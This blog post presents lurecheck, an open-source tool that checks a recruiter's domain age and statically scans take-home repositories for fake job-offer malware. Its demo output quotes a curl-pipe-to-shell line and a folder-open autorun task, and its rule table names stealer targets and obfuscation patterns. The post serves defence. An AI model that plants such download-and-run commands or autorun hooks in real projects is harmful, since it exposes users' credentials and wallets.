---
title: "lurecheck: check a job offer before you run its take-home task"
date: 2026-11-20
section: security
summary: "A small open-source Rust tool for developers who are looking for a job. It checks how old a company's domain is and scans a take-home repository for code that runs by itself, without executing anything."
license: own
draft: false
---

Developers who look for work are a target. The scheme is simple: a fake
recruiter offers a well-paid remote role, the "company" has a fresh website,
and after a short chat you get a take-home repository. The repository runs
malware the moment you open it in your editor or run `npm install`. The goal
is your browser passwords, your crypto wallets and your SSH keys.

I am looking for a job myself, and I got tired of checking every new company
by hand. So I wrote a small tool:
[lurecheck](https://github.com/cryply/lurecheck). It is open source, MIT,
written in Rust.

It looks at both ends of the lure:

- **the company domain**: how old it is and whether it looks alive;
- **the take-home repository**: a static scan. Nothing from the repository is
  executed.

## Install

You need a recent stable Rust (1.88 or newer).

```
git clone https://github.com/cryply/lurecheck
cd lurecheck
cargo install --path .
```

## Check a company

```
lurecheck domain new-company.example
```

It also accepts a URL or an e-mail address. The output looks like this (the
domain name is made up, the format is what the tool prints):

```
domain new-company.example
  registered:     2026-10-11
  first archived: -
  MX records:     no
  [HIGH] domain-young         new-company.example
         registered 40 days ago (2026-10-11)
  [MED ] never-archived       new-company.example
         no snapshot in the Wayback Machine
  [MED ] no-mail              new-company.example
         no MX records: the company domain cannot receive mail
DANGER: do not engage with this company
```

What it checks:

| Rule | Severity | Meaning |
|---|---|---|
| domain-young | high | registered less than 90 days ago |
| domain-new | medium | registered less than a year ago |
| archive-young | medium, high without a registration date | first Wayback Machine snapshot less than 90 days ago |
| never-archived | medium | no Wayback Machine snapshot at all |
| no-mail | medium | the domain has no MX records, so it cannot receive mail |
| virustotal | high or medium | antivirus engines flag the domain |

The VirusTotal lookup is optional. Set `VT_API_KEY` to a free key to turn it
on.

## Check a take-home repository

Do this **before** you open the folder in an editor.

```
lurecheck repo owner/name        # a GitHub repository
lurecheck repo ./take-home       # a local folder
```

Here is a real run on a small demo folder that I made for this note. It has a
VS Code task that starts by itself and an npm install hook:

```
repo ./take-home
  files scanned:  3
  [HIGH] vscode-autorun       .vscode/tasks.json:8
         task runs automatically when the folder is opened in VS Code
  [HIGH] config-pipe-to-shell .vscode/tasks.json:7
         downloads and runs a script: curl -s https://example.invalid/setup.sh | sh
  [MED ] npm-install-hook     package.json
         "postinstall" runs on npm install: node scripts/setup.js
DANGER: do not run this code
```

The rules:

| Rule | Severity | What it catches |
|---|---|---|
| vscode-autorun | high | a VS Code task with `"runOn": "folderOpen"` |
| config-pipe-to-shell | high | `curl ... \| sh` in VS Code or devcontainer config |
| npm-install-hook | medium, high with network or shell | `preinstall`, `install`, `postinstall`, `prepare` scripts |
| js-obfuscated | high | code from a JavaScript obfuscator (many `_0x...` names) |
| dynamic-exec | high | `eval` or `new Function` next to base64 decoding or downloads |
| py-dynamic-exec | high | Python `exec()` next to base64 decoding or downloads |
| spawns-with-url | medium | a file that starts processes and contains a URL |
| stealer-target | high | wallet extension ids, browser password files, Solana keys |
| hidden-indent | high | code pushed off-screen behind 150+ spaces |
| very-long-line | info | 5000+ characters on one line in a normal source file |

## Use it in scripts

The exit code tells the result: 0 clean, 1 suspicious, 2 danger, 3 error.
With `--json` the output is machine-readable.

I use it this way in my own job-alert script: every new listing has its
company site checked, and suspicious ones get a mark in the report. So far it
has flagged three "companies" whose sites were 9, 33 and 40 days old.

Results are cached in `~/.cache/lurecheck/`: domain facts for 7 days,
repository scans by exact content. `--fresh` ignores the cache.

## Limits

- **Clean is not a guarantee.** These are simple static rules. New tricks will
  pass. A danger result is a reason to stop and look; a clean result is not a
  reason to trust.
- **A young domain is not always a scam.** A real startup can be three weeks
  old. The tool gives you a signal, you make the decision.
- **Some registries give no registration date.** For `.de` it is not
  available, and lurecheck says so and uses the first Wayback snapshot
  instead.
- **Open take-home code in a sandbox anyway**: a virtual machine or a
  container, with no access to your real home folder. And do not click
  "Trust this folder" in VS Code for code from strangers.

## What is next

- A browser extension with the same rules, so the warning shows up on the job
  page and on the GitHub repository page.
- A shared database of reports, so the second person who meets a lure is
  warned.

Issues and pull requests are welcome:
[github.com/cryply/lurecheck](https://github.com/cryply/lurecheck).
